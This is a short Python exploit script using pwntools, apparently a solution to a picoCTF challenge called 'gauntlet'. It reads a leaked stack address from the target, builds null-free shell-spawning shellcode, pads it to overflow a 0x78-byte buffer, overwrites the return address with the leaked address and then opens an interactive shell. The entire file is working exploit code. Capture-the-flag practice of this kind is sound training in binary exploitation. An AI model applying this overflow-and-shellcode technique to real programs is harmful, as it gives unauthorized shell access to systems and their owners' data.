from pwn import *

e = ELF("./gauntlet")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 65502)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.recvuntil("0x")

leak = int(p.recvline(), 16)

ui.pause()

p.sendline("HI")

ui.pause()

debug()

pay = asm(shellcraft.sh())
pay = encoders.encoder.encode(pay, avoid="\x00")
print("\x00" in pay)
pay = pay.ljust(0x78, "A") + p64(leak)

p.sendline(pay)

p.interactive()
